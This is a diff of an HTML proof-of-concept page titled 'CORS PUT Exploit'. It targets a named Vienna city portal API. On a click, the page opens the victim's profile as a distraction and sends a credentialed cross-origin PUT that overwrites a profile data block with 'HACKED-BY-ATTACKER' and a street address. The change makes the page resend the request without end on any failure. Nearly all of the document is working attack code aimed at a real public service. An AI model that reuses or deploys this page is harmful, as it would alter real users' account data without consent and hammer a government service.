@@ -4,94 +4,104 @@
     <title>CORS PUT Exploit</title>
 </head>
 <body>
-    <p>Click anywhere on this page to trigger ONE Cross-origin PUT request.</p>
+    <p>Click anywhere on this page to trigger the Cross-origin PUT request.</p>
     <div id="response"></div>
 
     <script>
         document.addEventListener("DOMContentLoaded", () => {
-            let clicked = false;
+            let isAttacking = false;
             
             document.onclick = () => {
-                if (clicked) return; 
+                if (isAttacking) return; 
                 
-                clicked = true;
+                isAttacking = true;
                 // Open target site in new tab (distraction)
                 open('https://mein.wien.gv.at/Mein-Profil');
                 
-                // Send ONLY ONE PUT request
-                fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json, text/javascript, */*; q=0.01',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    },
-                    credentials: 'include',
-                    mode: 'cors',
-                    body: JSON.stringify({
-                        "id": null,
-                        "datensatz": "5797DABA-954A-4206-8922-39FED77C454D",
-                        "inhalt": {
-                            "title": "HACKED-BY-ATTACKER",
-                            "standard": true,
-                            "address": "Gudrunstraße 29/2, 1100 Wien",
-                            "coordinates": [16.390721448021026, 48.175427363211405],
-                            "source": "DSS-Portal/OGD",
+                function sendRequest() {
+                    // Send PUT request to vulnerable endpoint
+                    fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
+                        method: 'PUT',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json, text/javascript, */*; q=0.01',
+                            'X-Requested-With': 'XMLHttpRequest'
+                        },
+                        credentials: 'include',
+                        mode: 'cors',
+                        body: JSON.stringify({
+                            "id": null,
+                            "datensatz": "5797DABA-954A-4206-8922-39FED77C454D",
                             "inhalt": {
-                                "adresse": {
-                                    "adressart": 0,
-                                    "adresse": "Gudrunstraße 29/2, 1100 Wien",
-                                    "adresseKurzschreibweise": "Gudrunstraße 29/2",
-                                    "adressobjektId": 10221247,
-                                    "gemeindebezirksbezeichnung": "Favoriten",
-                                    "gemeindebezirksnummer": 10,
-                                    "gemeindekennziffer": 90001,
-                                    "gemeindename": "Wien",
-                                    "koordinatenbezugssystem": 4326,
-                                    "ländercode": "AUT",
-                                    "orientierungsnummer": "20",
-                                    "orientierungsnummerLage": 0,
-                                    "ortskennziffer": 91001,
-                                    "ortsname": "Favoriten",
-                                    "straßenkennziffer": 1660,
-                                    "zugangsadresspunktX": 48.175427363211405,
-                                    "zugangsadresspunktY": 16.390721448021026,
-                                    "PLZ": 1100,
-                                    "zusatzinformationen": {
-                                        "adressStraßenname": "Gudrunstraße",
-                                        "baublock": "",
-                                        "NUTS2": "",
-                                        "orientierungsnummerVon": "29",
-                                        "orientierungsnummerVerbindungszeichen": 0,
-                                        "straßenabschnittsId": "01660009017",
-                                        "zählbezirk": "1002",
-                                        "zählgebiet": "10023"
-                                    }
-                                },
-                                "eingang": "",
-                                "geschosstyp": "",
-                                "stiege": "2",
-                                "stock": "",
-                                "zimmer": "",
-                                "zimmertyp": "Tür"
+                                "title": "HACKED-BY-ATTACKER",
+                                "standard": true,
+                                "address": "Gudrunstraße 29/2, 1100 Wien",
+                                "coordinates": [16.390721448021026, 48.175427363211405],
+                                "source": "DSS-Portal/OGD",
+                                "inhalt": {
+                                    "adresse": {
+                                        "adressart": 0,
+                                        "adresse": "Gudrunstraße 29/2, 1100 Wien",
+                                        "adresseKurzschreibweise": "Gudrunstraße 29/2",
+                                        "adressobjektId": 10221247,
+                                        "gemeindebezirksbezeichnung": "Favoriten",
+                                        "gemeindebezirksnummer": 10,
+                                        "gemeindekennziffer": 90001,
+                                        "gemeindename": "Wien",
+                                        "koordinatenbezugssystem": 4326,
+                                        "ländercode": "AUT",
+                                        "orientierungsnummer": "20",
+                                        "orientierungsnummerLage": 0,
+                                        "ortskennziffer": 91001,
+                                        "ortsname": "Favoriten",
+                                        "straßenkennziffer": 1660,
+                                        "zugangsadresspunktX": 48.175427363211405,
+                                        "zugangsadresspunktY": 16.390721448021026,
+                                        "PLZ": 1100,
+                                        "zusatzinformationen": {
+                                            "adressStraßenname": "Gudrunstraße",
+                                            "baublock": "",
+                                            "NUTS2": "",
+                                            "orientierungsnummerVon": "29",
+                                            "orientierungsnummerVerbindungszeichen": 0,
+                                            "straßenabschnittsId": "01660009017",
+                                            "zählbezirk": "1002",
+                                            "zählgebiet": "10023"
+                                        }
+                                    },
+                                    "eingang": "",
+                                    "geschosstyp": "",
+                                    "stiege": "2",
+                                    "stock": "",
+                                    "zimmer": "",
+                                    "zimmertyp": "Tür"
+                                }
                             }
+                        })
+                    })
+                    .then(response => {
+                        if (response.status === 200) {
+                            // Success - show alert and stop
+                            return response.json().then(data => {
+                                alert('SUCCESS! Status 200\n\nResponse:\n' + JSON.stringify(data, null, 2));
+                            });
+                        } else {
+                            // Not 200 - send request again immediately
+                            document.getElementById('response').innerHTML = 
+                                'Status ' + response.status + ' - Sending request again...';
+                            sendRequest(); // Send again
                         }
                     })
-                })
-                .then(response => {
-                    document.getElementById('response').innerHTML = 
-                        'Request sent! Status: ' + response.status;
-                    
-                    if (response.status === 200) {
-                        return response.json().then(data => {
-                            alert('SUCCESS! Status 200\n\nResponse:\n' + JSON.stringify(data, null, 2));
-                        });
-                    }
-                })
-                .catch(error => {
-                    document.getElementById('response').innerHTML = 
-                        'Error: ' + error.message;
-                });
+                    .catch(error => {
+                        // Error - send request again immediately
+                        document.getElementById('response').innerHTML = 
+                            'Error - Sending request again...';
+                        sendRequest(); // Send again
+                    });
+                }
+                
+                // Start sending requests
+                sendRequest();
             }
         });
     </script>
